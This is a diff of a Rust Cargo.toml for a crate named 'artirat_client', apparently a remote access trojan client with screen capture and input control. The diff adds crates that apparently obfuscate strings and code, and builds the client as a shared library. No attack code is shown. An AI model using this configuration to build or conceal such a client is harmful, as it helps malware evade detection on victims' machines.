@@ -2,8 +2,12 @@
 name = "artirat_client"
 version = "0.2.1"
 edition = "2024"
-autolib = false
-autobins = false
+
+[lib]
+crate-type = ["lib", "cdylib"]
+
+[features]
+shared-lib = []
 
 [target.'cfg(windows)'.dependencies]
 winapi = {version = "0.3.9", features=[
@@ -40,21 +44,16 @@ rusqlite = { version = "0.39.0", features = ["bundled"] }
 zstd = { version = "0.13.3", features = ["zstdmt"] }
 openssl = { version = "0.10.79", features = ["vendored"] }
 openssl-sys = { version = "0.9", features = ["vendored"] }
+liblzma-sys = { version = "0.4", features = ["static"] }
 base64 = "0.22"
 uuid = { version = "1.11.1", features = ["v4"] }
 libc = { version = "0.2.186", features = ["align", "extra_traits", "use_std"] }
-tempfile = "3"
-sysinfo = "0.39.1"
-itertools = "0.14.0"
 enigo = { version = "0.6.1", features = ["platform_specific", "tokio"] }
 rand = { version = "0.8", features = [] }
+cryptify = "3.2.1"
+goldberg = "0.1.0"
 [target.'cfg(not(target_os = "android"))'.dependencies]
 screenshots = "0.8.10"
-
-[[bin]]
-name = "artirat_client"
-path = "src/main.rs"
-
 [profile.release]
 opt-level = "z"
 debug = 0
@@ -62,3 +61,4 @@ lto = true
 codegen-units = 1
 strip = true
 panic = "abort"
+#strip = true
